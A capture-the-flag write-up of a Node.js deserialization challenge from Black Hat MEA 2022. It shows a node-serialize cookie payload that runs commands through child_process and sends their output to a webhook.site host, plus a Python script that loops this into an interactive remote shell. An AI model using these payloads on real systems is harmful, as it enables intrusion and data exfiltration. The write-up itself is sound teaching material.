---
title: "Black notes challenge writeup"
author: "0xMesbaha"
cover: "/media/CTFs/black-notes/cover.png"
tags: ["CTF", "node-deserialization"]
date: 2022-10-01T12:49:18+34:08
draft: false
---

This challenge was in Blackhat CTF Qualifications 2022 and we have participated under the team 0xCha0s, we have managed to solve multiple challenges. this challenge was ranked medium for 250 pts.

<!--more-->


# Enumeration 

We are introduced with this web page , it has a login , register endpoints. running ffuf to collect other endpoints we got nothing interesting

```cmd
Login                   [Status: 200, Size: 7160, Words: 1532, Lines: 76]
logout                  [Status: 302, Size: 23, Words: 4, Lines: 1]
notes                   [Status: 302, Size: 28, Words: 4, Lines: 1]
register                [Status: 200, Size: 7180, Words: 1532, Lines: 76]
static                  [Status: 301, Size: 179, Words: 7, Lines: 11]
```
![error](/media/CTFs/black-notes/20220930232251.png)

Starting with **register** a new account , we can add some notes there

![error](/media/CTFs/black-notes/20220930232746.png)

checking the technology used we can see ``Express`` in the Response Headers so it is running ``node.js``

![error](/media/CTFs/black-notes/20220930232906.png)

Trying SSTI and other stuff doesn't work , Taking a look at cookies we can see  This interesting one

![error](/media/CTFs/black-notes/20220930233036.png)


Url decode Then Base64 decode gives value  ``{"notes":{"0":"Sample Note"}}``  , looks like the data is serialized. we can try to play with the value like :
``{"notes":{"0":"x}}`` and we got error revealing some information
![error](/media/CTFs/black-notes/20220930233413.png)

So it is most likely node deserialization exploitation. searching for it , found this article [here](https://blacksheephacks.pl/nodejs-deserialization/)

# Exploitation

Trying same payload with the `exec` function to get remote code execution

```json
{"notes":{"0":"_$$ND_FUNC$$_function(){\nrequire('child_process').exec('wget https://webhook.site/e9e83452-9176-4586-8c0a-f462bf4c9720?out=`id`', function(error, stdout, stderr) {});}()"}}
```

*note we will base64 encode it then Url encode it before modifying notes cookie*

![error](/media/CTFs/black-notes/20220930234414.png)

So it works ! , But note that it doesn't return the whole output , we can make a small python script to start enumerating the server searching for the flag 

```python
#!/usr/bin/python3
# Black Notes Black Hat MEA 2022 Qualifications
import requests
import json
import base64
import urllib.parse

url="https://blackhat4-1ab1a0cd6d8e8b0d40459b74a5627cbc-0.chals.bh.ctf.sa/notes"
while True:

	cmd=input(">>> ")
	
	data = {
	"notes" : {
	"0" :"_$$ND_FUNC$$_function(){\nrequire('child_process').exec('wget https://webhook.site/e9e83452-9176-4586-8c0a-f462bf4c9720?out=`"+cmd+"`', function(error, stdout, stderr) {});}()" 
	}
	}
	cookies = {
	'connect.sid' : "s%3AbLdD7_rmZVG1JvlS1rfXNwk1dTe3I5sI.HRceb%2BbqM7AtqRmnfikPGvmX70kG1o3OsbhAN1OoISo",
	'notes': urllib.parse.quote(base64.b64encode(str(json.dumps(data)).encode('ascii')))
	}
	#print(cookies['notes'])
	try:
		r= requests.get(url,cookies=cookies)
		print("[+] Please Check your hook ! ")
	except:
		print("[-] Error occured :(")
```

![error](/media/CTFs/black-notes/20221001001710.png)

and we got this which is not the flag :( 

![error](/media/CTFs/black-notes/20221001001723.png)


After a while and after checking other challenge talking about flag as environment variable  like this ``return os.getenv("FLAG")``  , i tried to use same technique here

![error](/media/CTFs/black-notes/20221001001925.png)

and finally !

![error](/media/CTFs/black-notes/20221001001936.png)

